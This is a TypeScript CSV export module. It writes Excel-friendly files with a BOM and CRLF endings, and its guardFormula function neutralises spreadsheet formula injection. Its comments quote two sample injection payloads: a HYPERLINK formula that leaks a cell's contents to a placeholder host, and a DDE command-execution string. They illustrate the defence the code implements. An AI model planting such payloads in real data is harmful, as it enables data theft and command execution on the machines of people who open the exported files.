import { formatCell } from './cell.js';
import type { ColumnDef, TransferRow } from '../types.js';

/**
 * RFC 4180 CSV, written for Excel first because that is what the file is opened
 * in.
 *
 * Three decisions here are not stylistic and are each covered by a test:
 *
 * 1. **A UTF-8 BOM leads the file.** Without it Excel on Windows decodes the
 *    bytes as the system ANSI codepage, and every Arabic export opens as
 *    `Ø§Ù„Ø¹Ù†ÙˆØ§Ù†`. Nothing in the pipeline reports a problem — the HTTP
 *    response is a correct UTF-8 CSV — so this is discovered only by a user,
 *    who reports it as "the export is broken".
 * 2. **Lines end with CRLF**, per the spec and because a lone LF splits rows
 *    unpredictably in older Excel builds.
 * 3. **Leading `=`, `+`, `@`, tab and CR in a text cell are neutralised.** See
 *    [guardFormula].
 */

const BOM = '﻿';
const CRLF = '\r\n';

/**
 * Blunts CSV injection: a cell whose text begins with a formula trigger is
 * prefixed with an apostrophe, which Excel and LibreOffice both read as "the
 * rest is literal text".
 *
 * Without it, one user storing `=HYPERLINK("https://x/?"&A1,"click")` in a note
 * title gets that formula executed in the spreadsheet of whoever exports and
 * opens the data — a stored attack that never touches this server's own
 * rendering and so is invisible to every XSS defence the app has. `+`, `@`, TAB
 * and CR are triggers alongside `=` in at least one major spreadsheet each.
 *
 * `-` is checked last and only when the value is **not** a plain number, so
 * `-12.5` survives as a number while `-2+3+cmd|' /C calc'!A0` does not.
 */
export function guardFormula(text: string): string {
  if (text === '') return text;
  const first = text[0]!;
  if (first === '=' || first === '+' || first === '@' || first === '\t' || first === '\r') {
    return `'${text}`;
  }
  if (first === '-' && !/^-?\d+(\.\d+)?$/.test(text)) {
    return `'${text}`;
  }
  return text;
}

/** Quotes a field only when it has to be quoted, doubling any embedded quote. */
export function csvEscape(text: string): string {
  if (/[",\r\n]/.test(text) || text !== text.trim()) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

function headerLine(columns: ColumnDef[]): string {
  // The header carries the wire `key`, never the localized label. The file is
  // round-tripped — exported, edited, re-imported — and a header that changes
  // with the caller's `Accept-Language` makes a file exported in Arabic
  // unimportable by an English session. Labels are the client's job to display.
  return columns.map((c) => csvEscape(c.key)).join(',') + CRLF;
}

function bodyLine(columns: ColumnDef[], row: TransferRow): string {
  return (
    columns
      .map((c) => {
        const text = formatCell(row[c.key], c.type);
        return csvEscape(c.type === 'string' ? guardFormula(text) : text);
      })
      .join(',') + CRLF
  );
}

/**
 * Streams the file as text chunks: BOM + header first, then one chunk per row.
 *
 * A generator rather than a returned string, so `export.service.ts` can pipe
 * straight into the response and hold one row in memory regardless of whether
 * the export is 10 rows or 50 000.
 */
export async function* csvChunks(
  columns: ColumnDef[],
  rows: AsyncIterable<TransferRow>,
): AsyncGenerator<string> {
  yield BOM + headerLine(columns);
  for await (const row of rows) {
    yield bodyLine(columns, row);
  }
}

/** Whole-file variant for small, known-size output — import templates and tests. */
export function csvFromRows(columns: ColumnDef[], rows: TransferRow[]): string {
  return BOM + headerLine(columns) + rows.map((r) => bodyLine(columns, r)).join('');
}
